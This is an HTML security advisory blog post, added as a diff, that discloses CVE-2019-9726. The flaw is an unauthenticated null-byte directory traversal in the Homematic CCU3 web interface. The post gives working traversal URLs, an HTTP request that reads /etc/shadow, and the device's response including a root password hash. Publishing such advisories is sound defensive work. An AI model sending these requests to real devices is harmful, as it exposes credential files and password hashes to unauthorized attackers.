@@ -1,0 +1,207 @@
+<html>
+	<head>
+	
+	<link href="//gmpg.org/xfn/11" rel="profile">
+	<meta http-equiv="content-type" content="text/html; charset=utf-8">
+	<title>CVE-2019-9726: Directory Traversal / Arbitrary File Read in Homematic CCU3 &middot; Patrick Münch Blog</title>
+	<meta name="mobile-web-app-capable" content="yes">
+	<meta name="HandheldFriendly" content="True" />
+	<meta name="MobileOptimized" content="320" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<link rel="stylesheet" type="text/css" media="only screen and (min-width: 900px)" href="/assets/css/desktop.css" />
+	<link rel="stylesheet" type="text/css" media="only screen and (max-width: 899px)" href="/assets/css/mobile.css" />
+	<link href="/assets/css/genericons.css" type="text/css" rel="stylesheet" />
+	<link href="/assets/css/syntax.css" type="text/css" rel="stylesheet" />
+	<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Fenix:400,400italic">
+	<link rel="apple-touch-icon" href="http://localhost:4000/assets/images/logo.jpeg">
+	<link rel="shortcut icon" href="http://localhost:4000/assets/images/favicon.ico">
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+	<script type="text/javascript" src="/assets/js/jquery-2.1.0.min.js"></script>
+	
+	<script type="text/javascript" src="/assets/js/jquery.stellar.min.js"></script>
+	
+	
+	<!-- Asynchronous Google Analytics snippet -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-114726397-1', 'auto');
+		ga('send', 'pageview');
+	</script>
+	
+	<!-- Theme Color for Chrome on Android Lollipop -->
+	<meta name="theme-color" content="#302F2D">
+</head>
+
+	<body>
+		<header class="clean" style="background-image: url(/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg); height: 100%; " data-stellar-background-ratio="0.5" data-stellar-horizontal-offset="50">
+	
+	<label class="menu" for="_1">
+	<span class="genericon genericon-menu"></span>
+</label>
+<input id="_1" type="checkbox">
+<div class="menu-content">
+	<p class="menu-title">Patrick Münch Blog<p>
+	<div class="menu" style="background-color: #1a1a1a; z-index: -1;"></div>
+	
+		<a href="/">Home</a>
+	
+	<hr>
+	<a href="https://twitter.com/atomiczero111" class="social-links-menu" target="_blank" title="Follow me on twitter"><span class="genericon genericon-twitter"></span></a><a href="https://github.com/atomic111" class="social-links-menu" target="_blank" title="Fork me on github"><span class="genericon genericon-github"></span></a>
+</div>
+<div class="social-links" data-stellar-ratio="0.1">
+	
+		<a href="https://twitter.com/atomiczero111" target="_blank" title="Follow me on twitter"><span class="genericon genericon-twitter"></span></a>
+	
+		<a href="https://github.com/atomic111" target="_blank" title="Fork me on github"><span class="genericon genericon-github"></span></a>
+	
+</div>
+
+	<div id="post-info" data-stellar-ratio="0.7">
+		<h1>CVE-2019-9726: Directory Traversal / Arbitrary File Read in Homematic CCU3</h1>
+		
+		<a class="site-title" href="https://twitter.com/atomiczero111"><div class="site-icon-small" style="background-image: url(https://avatars0.githubusercontent.com/u/7220740?s=400);"></div>Patrick Münch</a>, in 26 March 2019
+	</div>
+	
+	<div id="nav-icon" style="bottom: 30px;" data-stellar-ratio="4">
+		<a class="scroll" data-speed="500" href="#article"><span class="genericon genericon-expand"></span></a>
+	</div>
+</header>
+<div id="middle">
+	<div id="article">
+		<h1 id="overview">Overview</h1>
+
+<ul>
+  <li>Vendor: eQ-3 AG</li>
+  <li>Product: Homematic CCU3</li>
+  <li>Version: 3.43.15</li>
+  <li>Vulnerability: Arbitrary File Read</li>
+</ul>
+
+<h1 id="background">Background</h1>
+
+<p>HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.</p>
+
+<p>From the vendor’s website:
+“The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures.”</p>
+
+<h1 id="issue-description">Issue Description</h1>
+
+<p>While analyzing the implementation of the CCU3’s web interface, a Directory Traversal vulnerabilities has been identified, which can be exploited in order to read files from the CCU3’s filesystem. This vulnerability can be exploited by unauthenticated attackers with access to the web interface. The vulnerability exist because of erroneous handling of Nullbytes. The following URLs are proofed to be vulnerable:</p>
+
+<ul>
+  <li>http://1.1.1.1/.%00./.%00./tmp/event/subscriber.list</li>
+  <li>http://1.1.1.1/.%00./.%00./etc/shadow</li>
+</ul>
+
+<p>The following HTTP request illustrates the attack:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/.%00./.%00./etc/shadow</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">1.1.1.1</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">curl/7.64.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+</code></pre></div></div>
+
+<p>Response of the Homematic CCU3:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:$1$FgzlpeV5$8cHtTwR1K5UkDHyNDlmo51:17640:0:99999:7:::
+daemon:*:10933:0:99999:7:::
+bin:*:10933:0:99999:7:::
+sys:*:10933:0:99999:7:::
+sync:*:10933:0:99999:7:::
+mail:*:10933:0:99999:7:::
+www-data:*:10933:0:99999:7:::
+halt:*:10933:0:99999:7:::
+uucp:*:10933:0:99999:7:::
+operator:*:10933:0:99999:7:::
+ftp:*:10933:0:99999:7:::
+nobody:*:10933:0:99999:7:::
+_ntp:*:::::::
+sshd:*:::::::
+</code></pre></div></div>
+
+<h1 id="cve">CVE</h1>
+
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9726">CVE-2019-9726</a></p>
+
+<h1 id="cvssv3-base-score">CVSSv3 Base Score</h1>
+
+<p>CVSS Base Score: <strong>7.5</strong></p>
+
+<p>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</p>
+
+<h1 id="credit">Credit</h1>
+
+<p>Pascal Keul of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
+
+<p>Patrick Muench of <a href="https://www.sva.de">SVA System Vertrieb Alexander GmbH</a></p>
+
+<h1 id="disclaimer">Disclaimer</h1>
+
+<p>The information provided is released “as is” without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.</p>
+
+<p>The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.</p>
+
+	</div>
+	
+	<div id="comments">
+		
+	
+	<script src="https://apis.google.com/js/plusone.js"></script>
+	<div id="g-comments" class="g-comments" data-href="http://localhost:4000/article/homematic-ccu3-fileread" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
+	<script>
+		var width = $('#comments').width() * 0.9;
+		width = Math.round(width);
+		$("#g-comments").attr({ "data-width": width });
+	</script>
+
+
+	</div>
+	
+	<div class="social center">
+		<div class="network">
+		<a class="hn-link" href="javascript:window.location=%22http://news.ycombinator.com/submitlink?u=%22+encodeURIComponent(document.location)+%22&amp;t=%22+encodeURIComponent(document.title)">Discuss on Hacker News</a>
+		</div>
+		<div class="network twitter">
+		<a href="https://twitter.com/share" class="twitter-share-button" data-via="atomiczero111" data-count="none">Tweet</a>
+		<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+		</div>
+	</div>
+</div>
+
+
+<footer class="clean" style="background-image: url(/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg); height: 75%; min-height: 500px; " data-stellar-background-ratio="0.5" data-stellar-horizontal-offset="50" data-stellar-vertical-offset="50">
+	<div id="nav-icon" style="top: 60px;" data-stellar-ratio="0.8">
+		<a class="scroll" data-speed="500" href="#article"><span class="genericon genericon-collapse"></span></a>
+	</div>
+	<div id="post-info" data-stellar-ratio="0.5" data-stellar-vertical-offset="120">
+		<h3>Read next</h3>
+		<a href="/article/homematic-ccu3-unauthenticated-password-hash-disclosure">
+			<h1>CVE-2019-9727: Unauthenticated password hash disclosure in Homematic CCU3</h1>
+			
+				<h2></h2>
+			
+		</a>
+	</div>
+	<p class="copyright">&copy;2019, <a href="http://atomic111.github.io" target="_blank">Patrick Münch</a>. <a href="" target="_blank">All rights reserved</a>.</p>
+</footer>
+<script src="/assets/js/smooth-scroll.js"></script>
+
+		<script>
+		var width = $(window).width()
+		if ( width > 899 )
+		$( function(){
+			$.stellar({
+				responsive: true,
+			verticalScrolling: true,
+			horizontalOffset: 0,
+			verticalOffset: 0,
+			positionProperty: 'transform',
+			});
+		});
+		</script>
+	</body>
+</html>
